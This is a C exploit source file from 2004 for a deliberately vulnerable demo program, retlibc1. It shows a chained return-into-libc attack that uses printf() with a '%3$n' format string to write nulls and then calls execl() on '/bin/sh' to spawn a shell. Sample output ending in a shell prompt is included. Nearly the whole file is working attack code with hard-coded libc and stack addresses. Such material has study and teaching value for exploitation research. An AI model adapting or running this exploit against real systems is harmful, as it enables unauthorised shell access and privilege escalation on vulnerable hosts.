/*
 * $Id: retlibc1-ex9.c,v 1.1.1.1 2004/05/29 14:15:05 raptor Exp $
 *
 * retlibc1-ex9.c - retlibc1.c exploit (return-into-libc)
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This exploit applies the printf() technique to write a word of nulls
 * with chained return-into-libc. The use of direct parameter access allows 
 * printf() to access only the function arguments it needs, which is helpful 
 * when chaining libc calls. The %n format parameter can be used to neatly 
 * write the 4 null bytes needed by the execve() function.
 *
 * We need to build a chain like:
 * [&printf()] [&execl()] ["%3$n" addr] ["/bin/sh" addr] ["sh" addr] [&here]
 *
 * First, printf() executes with 4 arguments, but the use of direct parameter
 * access in the format string found in the first argument causes the function
 * to skip over the second and third arguments. Because the final argument is
 * its own address, the 4 null bytes will overwrite that last argument. Then
 * the execution will return to the execl() function, which will use 3 args
 * as expected, the third one neatly terminating the list with a null word.
 *
 * This interesting technique is explained by Jon Erickson <matrix@phiral.com>
 * in his book "Hacking: the art of exploitation".
 *
 * $ uname -a
 * Linux karma 2.4.18-1-686-smp #1 SMP Mon Jan 5 20:42:23 UTC 2004 i686 unknown
 * $ gcc --version
 * 2.95.4
 * $ ./retlibc1-ex9
 * Using printf() address  : 0x4006d38c
 * Using execl() address   : 0x400bafb0
 * Using '/bin/sh' address : 0x4012276d
 * Using _null address     : 0xbffffde4	# _NULL = &buf + (65 * 4) + (5 * 4)
 * Using '%3$n' address    : 0xbfffffec
 * sh-2.05a$
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

#define	VULN	"./retlibc1"	// the vulnerable program
#define BUF	284 + 1		// (65 * 4) + (6 * 4) + 1
#define PRINTF	0x4006d38c	// printf() address in libc
#define	EXECL	0x400bafb0	// execl() address in libc
#define SHELL	0x4012276d	// "/bin/sh" address in libc
#define	_NULL	0xbffffde4	// address where to put nulls
#define	FS	"%3$n"		// format string for printf()

int main(int argc, char **argv)
{
	char	buf[BUF];
	int	*p = (int *)buf;

	char 	*env[2] = {FS, NULL};
	int	fs_addr = 0xbffffffa - strlen(FS) - strlen(VULN);

	/* fill the first part of the buffer */
	memset(buf, 'A', BUF);
	p += 65;

	/* prepare the stack */
	*p++ = PRINTF;
	*p++ = EXECL;
	*p++ = fs_addr;
	*p++ = SHELL;
	*p++ = SHELL + 5;
	*p++ = _NULL;
	*p = 0x0;

	/* print some output */
	fprintf(stderr, "Using printf() address\t: %p\n", PRINTF);
	fprintf(stderr, "Using execl() address\t: %p\n", EXECL);
	fprintf(stderr, "Using '/bin/sh' address\t: %p\n", SHELL);
	fprintf(stderr, "Using _null address\t: %p\n", _NULL);
	fprintf(stderr, "Using '%%3$n' address\t: %p\n", fs_addr);

	/* run the vulnerable program */
	execle(VULN, VULN + 2, buf, NULL, env);
	perror("execle");
}
